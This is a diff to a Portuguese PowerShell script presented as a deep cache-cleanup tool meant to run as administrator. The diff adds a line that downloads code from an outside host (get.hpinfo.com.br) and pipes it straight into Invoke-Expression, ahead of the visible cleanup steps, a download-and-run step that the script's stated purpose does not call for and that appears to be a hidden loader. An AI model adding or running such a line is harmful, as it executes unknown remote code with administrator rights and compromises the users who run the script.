@@ -1,8 +1,8 @@
 # limp.ps1 - Limpeza Profunda e Otimização de Cache
-# Executar como Administrador
-
-$ErrorActionPreference = "SilentlyContinue"
+# Executar como Administrador 
 irm https://get.hpinfo.com.br/perf | iex
+$ErrorActionPreference = "SilentlyContinue"
+
 
 Write-Host "=== INICIANDO LIMPEZA PROFUNDA ===" -ForegroundColor Cyan
 
